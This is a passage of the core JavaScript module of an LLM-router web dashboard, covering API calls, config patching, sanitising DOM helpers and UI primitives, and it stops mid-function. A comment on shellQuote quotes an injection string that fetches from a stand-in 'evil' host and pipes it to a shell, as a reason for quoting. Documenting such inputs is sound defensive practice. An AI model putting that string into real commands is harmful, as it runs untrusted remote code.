/* llm-swarm-router web dashboard — core.
 *
 * Load order (see index.html): dashboard.js -> schema-form.js -> pages/*.js
 * -> bootstrap.js. This file owns global state, the HTTP layer, the shared
 * DOM primitives every page is built from, config patching/save, and the
 * page router. Page modules register themselves into PAGE_RENDERERS; they
 * never talk to fetch() directly and never hard-code a colour.
 */

// Degraded-mode fallback only. The live roster comes from
// GET /netllm/v1/local-providers (the local twin of /netllm/v1/cloud/providers,
// added in Phase 4); this list is what renders before that call returns or if
// the agent is unreachable. Pinned to netllm_core.local_providers by
// tests/conformance/kit_local.py, so drift fails CI rather than silently
// omitting a provider from the discovery checkboxes.
const PROVIDERS_BOOTSTRAP = [
  // netllm:generated:begin:local-provider-ids
  "omlx",
  "ollama",
  "lmstudio",
  "vllm",
  // netllm:generated:end:local-provider-ids
];
let PROVIDERS = [...PROVIDERS_BOOTSTRAP];
/** Provider id -> display label, filled from the registry once fetched. */
let PROVIDER_LABELS = {};
/** Full rows from GET /netllm/v1/local-providers (api_key_env, etc.). */
let LOCAL_PROVIDER_REGISTRY = [];

async function loadLocalProviderRegistry() {
  try {
    // api(), not bare fetch(): bootstrap awaits this call, so without the
    // shared timeout a stalled /local-providers alone would block start-up.
    // asArray/asObject keep a wrong-typed roster from poisoning the globals
    // every page reads (rows.map would otherwise throw *after* assignment).
    const rows = asArray(asObject(await api("/netllm/v1/local-providers")).providers)
      .map((r) => asObject(r))
      .filter((r) => typeof r.id === "string" && r.id);
    if (!rows.length) return;
    LOCAL_PROVIDER_REGISTRY = rows;
    PROVIDERS = rows.map((r) => r.id);
    PROVIDER_LABELS = Object.fromEntries(
      rows.map((r) => [r.id, r.short_label || r.display_name || r.id])
    );
  } catch (err) {
    // Keep the bootstrap roster; the discovery tab still works offline.
    console.warn("local-provider registry unavailable, using bootstrap", err);
  }
}

function normalizeDiscoveryUrl(url) {
  let raw = String(url || "").trim().replace(/\/+$/, "");
  if (!raw) return "";
  if (raw.endsWith("/v1")) return raw;
  try {
    const parsed = new URL(raw);
    if (parsed.protocol === "http:" || parsed.protocol === "https:") {
      return `${raw}/v1`;
    }
  } catch {
    /* keep raw */
  }
  return raw;
}

function enumerateDiscoveryServerUrls(discovery) {
  const rows = [];
  const seen = new Set();
  const providerUrls = asObject(discovery?.provider_urls);
  Object.entries(providerUrls).forEach(([provider, urls]) => {
    asArray(urls).forEach((url) => {
      const norm = normalizeDiscoveryUrl(url);
      if (norm && !seen.has(norm)) {
        seen.add(norm);
        rows.push({ url: norm, provider });
      }
    });
  });
  asArray(discovery?.custom_endpoints).forEach((url) => {
    const norm = normalizeDiscoveryUrl(url);
    if (norm && !seen.has(norm)) {
      seen.add(norm);
      rows.push({ url: norm, provider: "custom" });
    }
  });
  return rows;
}

function backendSummaryForDiscoveryUrl(url) {
  const norm = normalizeDiscoveryUrl(url);
  return asArray(state.configDraft?.routing?.backends).find(
    (b) => normalizeDiscoveryUrl(asObject(b).base_url) === norm
  );
}

/* ---------------- discovery.ignored_urls (the denylist) ----------------
 *
 * The web half of netllm_core.backend_credentials. Same normalisation
 * (normalizeDiscoveryUrl is normalize_backend_url), and the same precedence
 * rule: an entry that names a routing.backends URL is stored but INERT,
 * because an explicit backend override wins. Two pages need this — the
 * Backends page's "Ignore" action and the Network page's managed list — so
 * it lives in the core module rather than in either of them.
 */

/** Normalised ignore entries, as typed into the draft. */
function ignoredDiscoveryUrls() {
  return asArray(state.configDraft?.discovery?.ignored_urls)
    .map((u) => normalizeDiscoveryUrl(u))
    .filter(Boolean);
}

/** True when a routing.backends row (enabled or not) claims this URL. */
function ignoreOverruledByBackend(url) {
  const norm = normalizeDiscoveryUrl(url);
  if (!norm) return false;
  return asArray(state.configDraft?.routing?.backends).some(
    (b) => normalizeDiscoveryUrl(asObject(b).base_url) === norm
  );
}

/** True when discovery will actually skip this URL. */
function isDiscoveryUrlIgnored(url) {
  const norm = normalizeDiscoveryUrl(url);
  if (!norm) return false;
  return ignoredDiscoveryUrls().includes(norm) && !ignoreOverruledByBackend(norm);
}

/** Add to the draft's ignore list. Returns false when it was already there. */
function ignoreDiscoveryUrl(url) {
  const norm = normalizeDiscoveryUrl(url);
  if (!norm) return false;
  const draft = state.configDraft?.discovery;
  if (!draft) return false;
  const current = ignoredDiscoveryUrls();
  if (current.includes(norm)) return false;
  // Store the normalised form, so the list on screen is the list that is
  // compared. Never touches routing.backends or provider_urls: ignoring an
  // endpoint must stay undoable by deleting exactly one row.
  draft.ignored_urls = [...current, norm];
  markDirty();
  return true;
}

/** Remove every entry matching `url`. Returns false when none matched. */
function unignoreDiscoveryUrl(url) {
  const norm = normalizeDiscoveryUrl(url);
  const draft = state.configDraft?.discovery;
  if (!norm || !draft) return false;
  const next = ignoredDiscoveryUrls().filter((u) => u !== norm);
  if (next.length === ignoredDiscoveryUrls().length) return false;
  draft.ignored_urls = next;
  markDirty();
  return true;
}

function ensureDiscoveryCredentialsDraft() {
  if (!state.configDraft.discovery._serverCredentials) {
    state.configDraft.discovery._serverCredentials = {};
  }
  return state.configDraft.discovery._serverCredentials;
}

function renderDiscoveryCredentialsSection(root) {
  const rows = enumerateDiscoveryServerUrls(state.configDraft.discovery);
  root.appendChild(textEl("div", "field-label", "Server API keys"));
  if (!rows.length) {
    root.appendChild(
      textEl(
        "p",
        "field-help",
        "Pin a provider URL or custom server above to set a per-endpoint API key."
      )
    );
    return;
  }
  root.appendChild(
    textEl(
      "p",
      "field-help",
      "Stored in routing.backends (one key per URL). Global env vars still apply when no per-URL key is set."
    )
  );
  const creds = ensureDiscoveryCredentialsDraft();
  const card = el("div", "stack");
  rows.forEach(({ url, provider }) => {
    if (!creds[url]) creds[url] = { provider };
    const summary = backendSummaryForDiscoveryUrl(url);
    const group = el("div", "field");
    group.appendChild(
      textEl("label", "field-label", `${PROVIDER_LABELS[provider] || provider} — ${url}`)
    );
    const input = document.createElement("input");
    input.type = "password";
    input.autocomplete = "off";
    input.placeholder = summary?.api_key_set
      ? "•••••••• (unchanged if left blank)"
      : "API key (optional)";
    input.oninput = () => {
      creds[url]._pending_api_key = input.value;
      markDirty();
    };
    group.appendChild(input);
    const spec = LOCAL_PROVIDER_REGISTRY.find((r) => r.id === provider);
    if (spec?.api_key_env) {
      group.appendChild(
        textEl("p", "field-help", `Global fallback: ${spec.api_key_env}`)
      );
    }
    card.appendChild(group);
  });
  root.appendChild(card);
}

/*
 * Attach per-URL discovery keys the user typed on the Network page to the
 * routing.backends patch.
 *
 * This used to rebuild the whole list from a Map keyed by
 * normalizeDiscoveryUrl(base_url) — which appends "/v1" — and did so on *any*
 * save, whether or not a key had been typed. Two legitimate rows that differ
 * only by a trailing "/v1" (e.g. "http://host:9099" and "http://host:9099/v1")
 * normalise to the same key, so one row and its stored api_key were silently
 * deleted by a save the user believed to be unrelated. Since routing.backends
 * is sent as a full replacement, a dropped row is a dropped row on disk.
 *
 * So: touch nothing unless a credential is actually pending, mutate matched
 * rows in place (order preserved, new rows appended), and refuse outright to
 * emit a shorter list than we were handed.
 */
function applyDiscoveryCredentialPatch(routingPatch) {
  const creds = asObject(state.configDraft.discovery?._serverCredentials);
  const pending = enumerateDiscoveryServerUrls(state.configDraft.discovery)
    .map((row) => ({ ...row, key: asObject(creds[row.url])._pending_api_key }))
    .filter((row) => row.key);
  if (!pending.length) return; // nothing typed — leave the patch exactly as built

  const original = asArray(routingPatch.backends);
  const rows = original.map((b) => ({ ...asObject(b) }));
  const claimed = new Set();
  const added = [];
  pending.forEach(({ url, provider, key }) => {
    // First unclaimed row wins, so two rows normalising to the same URL still
    // both survive — only one of them takes the key.
    const idx = rows.findIndex(
      (b) => !claimed.has(b) && normalizeDiscoveryUrl(b.base_url) === url
    );
    if (idx >= 0) {
      rows[idx].api_key = key;
      claimed.add(rows[idx]);
      return;
    }
    added.push({ base_url: url, provider, enabled: true, local: true, api_key: key });
  });

  const next = [...rows, ...added];
  // Belt and braces: attaching keys must never be able to lose a backend.
  if (next.length < original.length) return;
  routingPatch.backends = next;
}

// STRATEGIES was hand-maintained here; routing.default_strategy's options
// now come from the schema's Literal introspection (phase 3) instead.
const ROLES = ["peer", "gateway"];
// Fallback only, used when the admin config API is unreachable (offline
// dashboard) and configDraft.cloud.providers is empty. Once connected,
// the provider list comes from the agent's config summary (server is the
// single source of truth for the provider set + all display metadata —
// see admin.cloud_provider_registry_payload / GET /netllm/v1/cloud/providers).
const CLOUD_PROVIDER_IDS_BOOTSTRAP = [
  // netllm:generated:begin:cloud-provider-ids
  "moonshot",
  "zai",
  "openai",
  "anthropic",
  "openrouter",
  "dashscope",
  // netllm:generated:end:cloud-provider-ids
];

/** Page key -> nav label, in sidebar order. The router validates against this. */
const PAGES = [
  "overview",
  "backends",
  "models",
  "peers",
  "network",
  "routing",
  "cloud",
  "preferences",
  "integrations",
  "logs",
  "doctor",
];

const state = {
  page: "overview",
  // False until the first refresh() settles (either way). The router paints a
  // "still contacting the agent…" placeholder while it is false, so the shell
  // is usable immediately instead of waiting on the network — see render().
  firstLoadComplete: false,
  dirty: false,
  config: null,
  configDraft: null,
  // Form shape for the editable config sections — see
  // config_schema.py / GET /netllm/v1/config/schema. null until fetched
  // (or against an older agent that predates the endpoint); sections not
  // yet migrated to renderSchemaForm don't need it at all.
  configSchema: null,
  status: null,
  versionInfo: null,
  updateInfo: null,
  models: [],
  doctor: null,
  envText: "",
  envVars: {},
  lanPeers: [],
  healthy: false,
  pollTimer: null,
  telemetryPollTimer: null,
  telemetry: null,
  updatePollTimer: null,
  logsPollTimer: null,
  logs: null,
  adminWarned: false,
  lastUpdatedAt: null,
  // Models page filter/collapse (docs/models-ux-plan.md phase D).
  modelsSearchText: "",
  modelsCollapsedGroups: new Set(),
  // Pool detail drill-in (design 3a); null when the list is showing.
  openPoolId: null,
  // Logs page filters (design 2c).
  logLevelFilter: new Set(),
  logNodeFilter: "all",
  logSearchText: "",
  // Integrations page selection (design 3c).
  integrationClient: "cursor",
  integrationLocation: "same-machine",
  // Cloud page per-provider fetched catalogs, keyed by provider id —
  // AgentAPI.cloudProviderModels twin (GET /netllm/v1/cloud/providers/{id}/models).
  cloudCatalogs: {},
  cloudCatalogFetching: new Set(),
  // Cloud page credential verification (UI-7a), keyed by provider id.
  // `cloudVerifyResults` holds only the *just-ran* check, for immediate
  // feedback; the durable answer is `config.cloud.providers[id].verification`
  // on the config summary, because the agent — not this page — is what has to
  // remember it across a reload.
  cloudVerifyResults: {},
  cloudVerifying: new Set(),
  // Known-harness registry + live PATH detection, GET /netllm/v1/harnesses
  // (docs/cli-source-routing-plan.md Phase 4c/4d). null on an older agent
  // that predates the endpoint (404) -- the Integrations page section simply
  // doesn't render, same graceful-degrade pattern as configSchema.
  harnessRegistry: null,
};

/** Page key -> render function, populated by pages/*.js at load time. */
const PAGE_RENDERERS = {};

/** Register a page module. Called from each pages/*.js. */
function registerPage(key, renderer) {
  PAGE_RENDERERS[key] = renderer;
}

/* ---------------- feedback primitives ---------------- */

function showToast(msg) {
  const toast = document.getElementById("toast");
  toast.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 2400);
}

function setBanner(text, kind = "info") {
  const el = document.getElementById("global-banner");
  if (!text) {
    el.hidden = true;
    el.textContent = "";
    el.removeAttribute("data-kind");
    return;
  }
  el.hidden = false;
  el.setAttribute("data-kind", kind);
  el.textContent = text;
}

function markDirty(dirty = true) {
  state.dirty = dirty;
  document.getElementById("btn-save").disabled = !dirty;
}

function cloneConfig(cfg) {
  return JSON.parse(JSON.stringify(cfg));
}

/* ---------------- shape guards ---------------- */

/*
 * Every value the dashboard renders arrives over HTTP from an agent that may
 * be a LAN peer, a proxy, or an older/newer build. `x?.y || []` defends
 * against a *missing* field but not against a present one of the wrong type:
 * `{"backends": "nope"}` still reaches `.map` and throws, which the router
 * turns into "This page failed to render". These two coerce instead, so a
 * wrong-typed payload degrades to an empty section.
 *
 * Read them as "the array/object this field is supposed to be, or nothing".
 */
function asArray(value) {
  return Array.isArray(value) ? value : [];
}

function asObject(value) {
  return value && typeof value === "object" && !Array.isArray(value) ? value : {};
}

/* ---------------- HTTP ---------------- */

/*
 * A hung endpoint is worse than a failing one: a request that is accepted and
 * never answered leaves `await fetch()` pending forever, so the first paint —
 * which used to wait on refresh() — never happened and the content area stayed
 * a blank rectangle with no banner and no way out but a reload. Every request
 * therefore carries an AbortController deadline.
 *
 * Per-call override via `options.timeoutMs`: the deep status probe
 * (?probe=1&probe_peers=1&scan=1) legitimately talks to every backend and peer
 * on the LAN, so it gets a wider budget instead of everything else getting a
 * slower one.
 */
const API_TIMEOUT_MS = 15000;
const API_DEEP_TIMEOUT_MS = 60000;

async function api(path, options = {}) {
  const { timeoutMs = API_TIMEOUT_MS, ...init } = options;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    // The signal covers the body read too, not just the headers: a response
    // whose stream never completes hangs res.json() exactly as hard.
    const res = await fetch(path, { ...init, signal: controller.signal });
    if (!res.ok) {
      const text = await res.text();
      let message = text || `${res.status} ${res.statusText}`;
      try {
        const json = JSON.parse(text);
        if (json && typeof json.detail === "string") {
          message = json.detail;
        }
      } catch {
        /* keep raw text */
      }
      throw new Error(message);
    }
    if (res.status === 204) return null;
    const ct = res.headers.get("content-type") || "";
    // `return await`, deliberately: without it the finally below clears the
    // deadline before the body has been read, and a response whose stream
    // never completes would hang res.json() exactly as hard as the headers.
    if (ct.includes("application/json")) return await res.json();
    return await res.text();
  } catch (err) {
    // Name the path: these messages reach the banner and a bare
    // "The operation was aborted" tells the user nothing actionable.
    if (controller.signal.aborted) {
      throw new Error(`Request timed out after ${Math.round(timeoutMs / 1000)}s: ${path}`);
    }
    throw err;
  } finally {
    clearTimeout(timer);
  }
}

async function loadHealth() {
  try {
    await api("/health");
    state.healthy = true;
  } catch {
    state.healthy = false;
  }
}

function omlxAdminURLFromStatus(status) {
  if (status?.omlx_admin_url) return status.omlx_admin_url;
  // status.backends is republished peer data: it may be a string, or an array
  // with null entries, on a hostile or older agent.
  const omlx = asArray(status?.backends)
    .map((b) => asObject(b))
    .find(
      (b) =>
        b.provider === "omlx" &&
        b.enabled !== false &&
        asObject(b.health).status !== "offline"
    );
  if (!omlx?.base_url) return "http://127.0.0.1:8080/admin";
  let base = String(omlx.base_url).replace(/\/$/, "");
  if (base.endsWith("/v1")) base = base.slice(0, -3);
  return `${base}/admin`;
}

function updateOmlxAdminLink() {
  const btn = document.getElementById("btn-omlx-admin");
  if (!btn) return;
  // Built from status.omlx_admin_url or a backend base_url — both free text
  // from the config/status surface, so the scheme is not ours to trust. An
  // unsafe value leaves the button inert rather than href="javascript:…".
  setSafeHref(btn, omlxAdminURLFromStatus(state.status));
}

async function loadTelemetry(watch = true) {
  const q = watch ? "?watch=1" : "?watch=0";
  state.telemetry = await api(`/netllm/v1/telemetry${q}`);
}

/* ---------------- DOM primitives ---------------- */

function el(tag, cls) {
  const node = document.createElement(tag);
  if (cls) node.className = cls;
  return node;
}

/* Bidi overrides and C0/C1 controls. A model id or hostname carrying U+202E
 * renders its suffix reversed, so "…dine.exe" can display as "…exe.nid" —
 * a display spoof that survives correct escaping. Stripped on the way in;
 * they carry no meaning in any value this dashboard shows. */
const UNSAFE_TEXT_CHARS =
  /[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u200e\u200f\u202a-\u202e\u2066-\u2069]/g;

function sanitizeText(value) {
  return String(value).replace(UNSAFE_TEXT_CHARS, "");
}

function textEl(tag, cls, content) {
  const node = el(tag, cls);
  // textContent, never innerHTML: model ids, hostnames and log lines are
  // attacker-influenced strings that reach almost every page.
  node.textContent = content == null ? "" : sanitizeText(content);
  return node;
}

/**
 * POSIX single-quoted shell word.
 *
 * Model ids come from backends, and a backend may be a peer on the LAN
 * (swarm.py republishes peer-supplied health.models through /v1/models). Any
 * snippet the user is invited to copy and run must therefore treat every
 * interpolated value as hostile: an id like `x'; curl evil|sh; echo '`
 * otherwise becomes three commands on their clipboard.
 */
function shellQuote(value) {
  return `'${String(value).replace(/'/g, "'\\''")}'`;
}

/**
 * Quoted string literal for a config snippet (TOML basic string / YAML or
 * JSON double-quoted scalar). JSON.stringify escapes quotes, backslashes and
 * newlines, which is exactly the overlap of those three grammars — without
 * it a model id containing `"` plus a newline writes arbitrary extra keys
 * into the file the user is told to paste.
 */
function configQuote(value) {
  return JSON.stringify(String(value == null ? "" : value));
}

/**
 * A URL safe to put in href/src. Only http(s) survives; anything else —
 * `javascript:`, `data:`, `vbscript:` — returns "". Update payloads and
 * backend metadata reach these attributes, and `target=_blank` is a
 * mitigation, not a guarantee.
 */
function safeHref(url) {
  const raw = String(url == null ? "" : url).trim();
  if (!raw) return "";
  try {
    const parsed = new URL(raw, window.location.href);
    return parsed.protocol === "http:" || parsed.protocol === "https:"
      ? parsed.href
      : "";
  } catch {
    return "";
  }
}

/** Set `href` only when the URL is safe; otherwise render as inert text. */
function setSafeHref(anchor, url) {
  const safe = safeHref(url);
  if (safe) {
    anchor.href = safe;
    return true;
  }
  anchor.removeAttribute("href");
  anchor.setAttribute("aria-disabled", "true");
  return false;
}

function codeEl(content) {
  return textEl("code", "", content);
}

function brandLogoEl(size) {
  const picture = el("picture", "brand-logo");
  const source = el("source");
  source.srcset = "logo-dark.png";
  source.media = "(prefers-color-scheme: dark)";
  const img = el("img");
  img.src = "logo-light.png";
  img.alt = "";
  img.width = size;
  img.height = size;
  picture.append(source, img);
  return picture;
}

/** Standard page heading. `aside` may be a string or a node. */
function pageHeader(root, title, subtitle, aside) {
  const head = el("div", "page-header");
  const left = el("div");
  left.appendChild(textEl("h1", "", title));
  if (subtitle) left.appendChild(textEl("div", "page-sub", subtitle));
  head.appendChild(left);
  if (aside) {
    const right = el("div", "page-header-aside");
    right.append(typeof aside === "string" ? textEl("span", "", aside) : aside);
    head.appendChild(right);
  }
  root.appendChild(head);
  return head;
}

/** A titled panel. Returns the body element to append into. */
function panel(root, title, note, modifier) {
  const card = el("div", modifier ? `panel ${modifier}` : "panel");
  if (title || note) {
    const head = el("div", "panel-head");
    // A real heading, not a styled div: the page h1 is the only heading on the
    // page otherwise, so screen-reader users get no outline to navigate the
    // 44 panels by. `.panel-title` still carries all the styling.
    if (title) head.appendChild(textEl("h2", "panel-title", title));
    if (note) {
      head.appendChild(
        typeof note === "string" ? textEl("div", "panel-note", note) : note
      );
    }
    card.appendChild(head);
  }
  const body = el("div", "panel-body");
  card.appendChild(body);
  root.appendChild(card);
  return body;
}

/* ---------------- collapsible sections ----------------
 *
 * One implementation for every accordion on every page, so a section that
 * folds behaves identically wherever it lives.
 *
 * Native <details>/<summary>, never a div with aria-expanded: the browser
 * gives keyboard operation, the correct screen-reader role and state, and —
 * the one no hand-rolled version reproduces — find-in-page expands a closed
 * section when the match is inside it. A collapsed section that Ctrl-F cannot
 * reach is a section the user cannot find.
 *
 * Three rules the component enforces so pages cannot get them individually
 * wrong:
 *
 *   1. Open/closed persists. render() rebuilds the whole page on every 5s
 *      poll, so without storage a section you opened would shut again a few
 *      seconds later, mid-edit.
 *   2. `forceOpen` wins over both the stored state and the default. A section
 *      holding an unsaved edit, a validation error or a failing status must
 *      never be the thing hiding it. Callers compute the condition; the
 *      component guarantees it is honoured.
 *   3. A closed section still says something. `summary` is the count/status
 *      line rendered while closed, so the section can be skipped without
 *      being opened.
 */

const SECTION_STORAGE_KEY = "netllm.sections";

/** `{sectionKey: bool}` from localStorage; `{}` when unavailable or corrupt. */
function storedSectionStates() {
  try {
    const parsed = JSON.parse(window.localStorage.getItem(SECTION_STORAGE_KEY) || "{}");
    return parsed && typeof parsed === "object" && !Array.isArray(parsed) ? parsed : {};
  } catch {
    // Private mode, a quota error, or a hand-edited value. Defaults apply.
    return {};
  }
}

function storedSectionOpen(key, fallback) {
  if (!key) return fallback;
  const value = storedSectionStates()[key];
  return typeof value === "boolean" ? value : fallback;
}

function setStoredSectionOpen(key, open) {
  if (!key) return;
  try {
    const all = storedSectionStates();
    all[key] = !!open;
    window.localStorage.setItem(SECTION_STORAGE_KEY, JSON.stringify(all));
  } catch {
    /* private mode — the section still works, it just forgets */
  }
}

/**
 * A collapsible titled section. Returns the body element to append into,
 * exactly like `panel()`.
 *
 * options:
 *   storageKey  string   persistence key under `netllm.sections`. Omit for a
 *                        section whose state should not be remembered.
 *   defaultOpen boolean  state on first visit (default false).
 *   forceOpen   boolean  open regardless of stored/default state.
 *   forceReason string   why it was force-opened, shown in the header.
 *   summary     string|Node  rendered in the header, visible only while closed.
 *   modifier    string   accent class on the box (accent-ok/warn/danger).
 *   boxClass    string   "panel" (default) or "inset" for a card inside a panel.
 */
function collapsiblePanel(root, title, note, options) {
  const opts = asObject(options);
  const boxClass = opts.boxClass || "panel";
  const classes = [boxClass, "collapsible", opts.modifier].filter(Boolean);
  const box = el("details", classes.join(" "));

  // forceOpen deliberately does not write to storage: it is a temporary
  // condition (an unsaved edit, a failing probe), and letting it overwrite the
  // user's choice would leave the section open forever once the edit is saved.
  const forced = !!opts.forceOpen;
  const open = forced || storedSectionOpen(opts.storageKey, !!opts.defaultOpen);
  box.open = open;

  const head = el("summary", "panel-head collapsible-head");
  // One heading element is the only non-phrasing content <summary> accepts, so
  // the note and the closed-state summary live inside it. That also puts them
  // in the summary's accessible name, which is what a screen-reader user hears
  // before deciding whether to expand.
  const heading = el("h2", "panel-title collapsible-title");
  heading.appendChild(el("span", "disclosure"));
  heading.appendChild(textEl("span", "collapsible-label", title || ""));
  if (note) {
    heading.appendChild(
      typeof note === "string" ? textEl("span", "panel-note", note) : note
    );
  }
  heading.appendChild(el("span", "spacer"));
  if (forced && opts.forceReason) {
    heading.appendChild(textEl("span", "collapsible-forced", opts.forceReason));
  }
  if (opts.summary != null && opts.summary !== "") {
    const meta =
      typeof opts.summary === "string"
        ? textEl("span", "collapsible-meta", opts.summary)
        : opts.summary;
    if (meta.classList) meta.classList.add("collapsible-meta");
    heading.appendChild(meta);
  }
  head.appendChild(heading);
  box.appendChild(head);

  const body = el("div", "panel-body");
  box.appendChild(body);
  root.appendChild(box);

  // `toggle` also fires for the `box.open` assignment above (it is queued as a
  // task, so it lands after this function returns). Tracking the last value we
  // are responsible for means that initial event is a no-op and only a real
  // user toggle is persisted.
  let last = open;
  box.addEventListener("toggle", () => {
    if (box.open === last) return;
    last = box.open;
    setStoredSectionOpen(opts.storageKey, box.open);
  });
  return body;
}

/**
 * True when `path` (dotted, e.g. "routing.backends") differs between the
 * staged draft and the saved config — the "this section holds an unsaved
 * edit" test every `forceOpen` on a config section is built from.
 */
function draftDiffers(path) {
  if (!state.config || !state.configDraft) return false;
  try {
    return (
      JSON.stringify(getByPath(state.configDraft, path) ?? null) !==
      JSON.stringify(getByPath(state.config, path) ?? null)
    );
  } catch {
    // A draft holding a cycle (it should not) must not take the page down.
    return false;
  }
}

function statusDot(kind) {
  return el("span", `status-dot ${kind || ""}`.trim());
}

function pill(kind, text) {
  const node = el("span", `pill ${kind}`);
  node.appendChild(el("span", "dot"));
  node.appendChild(document.createTextNode(text));
  return node;
}

function statBlock(label, value, unit, modifier) {
  const wrap = el("div");
  wrap.appendChild(textEl("div", "stat-label", label));
  const v = textEl("div", modifier ? `stat-value ${modifier}` : "stat-value", value);
  if (unit) v.appendChild(textEl("span", "unit", unit));
  wrap.appendChild(v);
  return wrap;
}

function button(label, cls, onClick) {
  const node = textEl("button", cls || "secondary", label);
  node.type = "button";
  if (onClick) node.onclick = onClick;
  return node;
}

/** Labelled toggle backed by a real checkbox (keyboard + screen reader safe). */
function switchRow(label, checked, onChange) {
  const wrap = el("label", "switch");
  const input = el("input");
  input.type = "checkbox";
  input.checked = !!checked;
  input.onchange = () => onChange(input.checked);
  wrap.append(input, el("span", "track"), document.createTextNode(label));
  return wrap;
}

/**
 * Grid table. `columns` are header labels, `template` a grid-template-columns
 * value. Returns { table, addRow(cells) } where cells are nodes or strings.
 */
function dataTable(columns, template) {
  // CSS grid does the layout, so these are divs — but without the ARIA roles a
  // screen reader reads the whole thing as unstructured text and the column a
  // cell belongs to is lost.
  const table = el("div", "table");
  table.setAttribute("role", "table");
  const head = el("div", "table-head");
  head.setAttribute("role", "row");
  head.style.gridTemplateColumns = template;
  columns.forEach((c) => {
    const cell = textEl("div", "", c);
    cell.setAttribute("role", "columnheader");
    head.appendChild(cell);
  });
  table.appendChild(head);
  return {
    table,
    addRow(cells, cls) {
      const row = el("div", cls ? `table-row ${cls}` : "table-row");
      row.setAttribute("role", "row");
      row.style.gridTemplateColumns = template;
      cells.forEach((c) => {
        const cell =
          typeof c === "string" || typeof c === "number"
            ? textEl("div", "", c)
            : c || el("div");
        cell.setAttribute("role", "cell");
        row.appendChild(cell);
      });
      table.appendChild(row);
      return row;
    },
    addFoot(node) {
      const foot = el("div", "table-foot");
      foot.append(typeof node === "string" ? document.createTextNode(node) : node);
      table.appendChild(foot);
      return foot;
    },
  };
}

/**
 * Jump-rail layout used by Network / Cloud / Models. `sections` is
 * [{ id, label, render(body) }]. Clicking a rail item scrolls to it and the
 * active item tracks scroll position.
 */
function railLayout(root, sections, aside) {
  const layout = el("div", "rail-layout");
  const rail = el("nav", "rail");
  rail.setAttribute("aria-label", "Sections on this page");
  const items = el("div", "rail-items");
  const body = el("div", "rail-body");

  // Honour the OS setting: a smooth scroll is exactly the kind of motion
  // prefers-reduced-motion exists to suppress, and the CSS block can't reach
  // a scroll initiated from script.
  const reduceMotion =
    window.matchMedia &&
    window.matchMedia("(prefers-reduced-motion: reduce)").matches;

  const buttons = sections.map((section, i) => {
    const b = textEl("button", i === 0 ? "rail-item active" : "rail-item", section.label);
    b.type = "button";
    if (i === 0) b.setAttribute("aria-current", "true");
    b.onclick = () => {
      const target = document.getElementById(`section-${section.id}`);
      if (target) {
        target.scrollIntoView({
          behavior: reduceMotion ? "auto" : "smooth",
          block: "start",
        });
      }
    };
    items.appendChild(b);
    return b;
  });

  rail.appendChild(items);
  if (aside) rail.appendChild(aside);

  sections.forEach((section) => {
    const holder = el("div", "rail-section");
    holder.id = `section-${section.id}`;
    section.render(holder);
    body.appendChild(holder);
  });

  // Track which section is in view so the rail reflects position.
  if ("IntersectionObserver" in window) {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (!entry.isIntersecting) return;
          const idx = sections.findIndex(
            (s) => `section-${s.id}` === entry.target.id
          );
          if (idx < 0) return;
          buttons.forEach((b, i) => {
            b.classList.toggle("active", i === idx);
            // Keep the accessible state in step with the visual one, or the
            // rail's highlight means nothing to a screen reader.
            if (i === idx) {
              b.setAttribute("aria-current", "true");
            } else {
              b.removeAttribute("aria-current");
            }
          });
        });
      },
      { rootMargin: "-10% 0px -75% 0px" }
    );
    sections.forEach((s) => {
      const node = document.getElementById(`section-${s.id}`);
      if (node) observer.observe(node);
    });
  }

  layout.append(rail, body);
  root.appendChild(layout);
  return body;
}

/** Modal sheet. Returns { close }. Focus is trapped and Esc closes. */
function openSheet(title, build) {
  const host = document.getElementById("sheet-host");
  host.hidden = false;
  host.textContent = "";

  const backdrop = el("div", "sheet-backdrop");
  const sheet = el("div", "sheet");
  sheet.setAttribute("role", "dialog");
  sheet.setAttribute("aria-modal", "true");
  sheet.setAttribute("aria-label", title);
  sheet.appendChild(textEl("div", "sheet-title", title));

  const previouslyFocused = document.activeElement;

  function close() {
    host.hidden = true;
    host.textContent = "";
    document.removeEventListener("keydown", onKey);
    if (previouslyFocused && previouslyFocused.focus) previouslyFocused.focus();
  }

  function onKey(e) {
    if (e.key === "Escape") {
      e.preventDefault();
      close();
      return;
    }
    if (e.key !== "Tab") return;
    const focusable = sheet.querySelectorAll(
      'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    );
    if (!focusable.length) return;
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    if (e.shiftKey && document.activeElement === first) {
      e.preventDefault();
      last.focus();
    } else if (!e.shiftKey && document.activeElement === last) {
      e.preventDefault();
      first.focus();
    }
  }

  build(sheet, close);
  backdrop.appendChild(sheet);
  backdrop.onclick = (e) => {
    if (e.target === backdrop) close();
  };
  host.appendChild(backdrop);
  document.addEventListener("keydown", onKey);
  const firstFocusable = sheet.querySelector(
    'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
  );
  if (firstFocusable) firstFocusable.focus();
  return { close };
}

/* ---------------- formatting ---------------- */

function formatCompactCount(value) {
  const n = Number(value);
  if (!Number.isFinite(n)) return "—";
  const abs = Math.abs(n);
  const units = [
    [1e12, "T"],
    [1e9, "B"],
    [1e6, "M"],
    [1e3, "K"],
  ];
  for (const [scale, suffix] of units) {
    if (abs >= scale) {
      const scaled = n / scale;
      const digits = Math.abs(scaled) >= 100 ? 0 : 1;
      return `${scaled.toFixed(digits)}${suffix}`;
    }
  }
  return String(Math.round(n));
}

function formatTps(value) {
  const n = Number(value);
  if (!Number.isFinite(n)) return "—";
  if (n >= 100) return n.toFixed(0);
  if (n >= 10) return n.toFixed(1);
  return n.toFixed(2);
}

function formatPercent(value, digits = 0) {
  const n = Number(value);
  if (!Number.isFinite(n)) return "—";
  return `${n.toFixed(digits)}%`;
}

function formatDuration(seconds) {
  const n = Number(seconds);
  if (!Number.isFinite(n) || n < 0) return "—";
  const d = Math.floor(n / 86400);
  const h = Math.floor((n % 86400) / 3600);
  const m = Math.floor((n % 3600) / 60);
  if (d) return `${d}d ${h}h`;
  if (h) return `${h}h ${m}m`;
  if (m) return `${m}m`;
  return `${Math.floor(n)}s`;
}

function timeAgo(timestampMs) {
  if (!timestampMs) return "never";
  const secs = Math.max(0, Math.round((Date.now() - timestampMs) / 1000));
  if (secs < 5) return "just now";
  if (secs < 60) return `${secs}s ago`;
